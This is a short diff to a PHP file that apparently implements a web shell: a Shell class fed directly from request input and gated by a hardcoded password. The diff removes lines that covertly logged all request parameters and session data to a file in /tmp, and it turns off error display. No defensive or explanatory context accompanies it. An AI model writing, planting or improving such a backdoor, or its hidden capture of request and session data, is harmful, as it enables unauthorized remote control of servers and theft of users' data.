@@ -274,11 +274,7 @@ class Shell{
         return $this;
     }
 }
-
-@session_start();
-file_put_contents('/tmp/bare.log', json_encode($_REQUEST) . PHP_EOL, FILE_APPEND);
-file_put_contents('/tmp/bare.log', json_encode($_SESSION) . PHP_EOL, FILE_APPEND);
-@ini_set("display_errors", 1);
+@ini_set("display_errors", 0);
 define('PASSWORD', 'misery');
 define('USER', '~');
 $shell = new Shell($_REQUEST);
